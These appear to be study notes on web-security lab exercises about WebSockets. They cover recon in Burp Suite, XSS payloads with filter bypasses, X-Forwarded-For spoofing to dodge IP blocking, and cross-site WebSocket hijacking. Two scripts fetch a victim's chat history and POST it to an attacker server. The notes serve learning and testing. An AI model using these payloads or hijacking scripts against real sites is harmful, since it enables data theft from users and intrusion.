![[WebSockets.jpg]]
# Recon

On the Proxy tab in Burp Suite, there is a “WebSockets history” section. This section will contain any WebSockets messages initiated by the application. If this section has any requests, then the application is using WebSockets.

After identifying that WebSockets are in use, the 3 labs on this document can help to formulate ideas to attack the application.
# XSS Exploit

Try to submit an XSS payload within a parameter in the WebSocket message. The application is returning this value without any input validation or encoding, and it is between some HTML tags, so the data is executed as JavaScript code.
# XSS Exploit + Brute Force Bypass

Use the WebSockets to exploit an XSS vulnerability. If the application is blacklisting your IP address, try using the X-Forwarded-For header to spoof the IP address. Try a variety of different payloads depending on how the application responds. 

A final XSS payload using backticks since the app was not allowing to use brackets:

```json
{"message":"Test<img src=x oNeRRoR=alert`1`>"}
```

Another payload that worked was HTML encoding the "alert" keyword:

```json
{"message":"<img src=x OnErRoR=&#97;&#108;&#101;&#114;&#116;(1)>"}
```
# Cross-Site WebSocket Hijacking

Identify if the WebSockets Handshake request is vulnerable to Cross-Origin WebSocket Hijacking/CSRF attack. The handshake request can be identified by looking for the following headers in the WebSockets requests:

- Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
- Connection: keep-alive, Upgrade
- Upgrade: websocket

If the handshake request relies solely on session cookies and does not contain any unpredictable parameters, then it is vulnerable to a CSRF attack. Depending on how the application uses the WebSocket's, we can perform unauthorized actions or retrieve sensitive data that the user can access.

As an example, the payload below can be used to retrieve sensitive information from the application that belongs to another user. When we send the "READY" command to the server via the WebSocket message, all the past chat messages will be received. 

When the messages are received from the server, they will be sent to attacker's server. This is possible as cross-site websocket hijacking attacks, allows for 2-way interaction, unlike standard CSRF attacks.

Host the following in the exploit server:

```html
<script>
    var ws = new WebSocket('wss://VULNERABLE-WEBSOCKET-URL');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ATTACKER-SERVER', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

An example exploitation payload - although this does not work in the labs, this is something that can be done to inject XSS through web socket messages to attack other users. The "message" parameter in the lab was used to communicate/send messages to the server through web socket.

```html
<script>
    var ws = new WebSocket('wss://0a97008101b00a8.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("{\"message\":\"<img src=x onerror=alert(1)>\"}");
    };
    ws.onmessage = function(event) {
        fetch('https://a8jc1jg75.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

